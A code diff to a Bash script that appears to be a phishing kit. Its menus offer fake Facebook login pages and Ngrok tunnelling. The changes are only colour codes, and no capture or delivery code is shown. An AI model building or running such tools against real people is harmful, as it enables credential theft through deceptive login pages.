@@ -367,9 +367,9 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${YELLOW}[${WHITE}01${RED}]${ORANGE} Localhost ${YELLOW}[${CYAN}For Devs Only${YELLOW}]
-		${YELLOW}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${YELLOW}[${CYAN}Hotspot Required${YELLOW}]
-		${YELLOW}[${WHITE}03${RED}]${ORANGE} Ngrok.io  ${YELLOW}[${CYAN}Without Hotspot${YELLOW}]
+		${GREEN}[${WHITE}01${GREEN}]${ORANGE} Localhost ${GREEN}[${CYAN}For Devs Only${GREEN}]
+		${GREEN}[${WHITE}02${GREEN}]${ORANGE} Ngrok.io  ${GREEN}[${CYAN}Hotspot Required${GREEN}]
+		${GREEN}[${WHITE}03${GREEN}]${ORANGE} Ngrok.io  ${GREEN}[${CYAN}Without Hotspot${GREEN}]
 
 	EOF
 
@@ -391,14 +391,14 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${YELLOW}[${WHITE}01${YELLOW}]${ORANGE} Traditional Login Page
-		${YELLOW}[${WHITE}02${YELLOW}]${ORANGE} Advanced Voting Poll Login Page
-		${YELLOW}[${WHITE}03${YELLOW}]${ORANGE} Fake Security Login Page
-		${YELLOW}[${WHITE}04${YELLOW}]${ORANGE} Facebook Messenger Login Page
+		${GREEN}[${WHITE}01${GREEN}]${ORANGE} Traditional Login Page
+		${GREEN}[${WHITE}02${GREEN}]${ORANGE} Advanced Voting Poll Login Page
+		${GREEN}[${WHITE}03${GREEN}]${ORANGE} Fake Security Login Page
+		${GREEN}[${WHITE}04${GREEN}]${ORANGE} Facebook Messenger Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${YELLOW}[${WHITE}-${YELLOW}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="facebook"
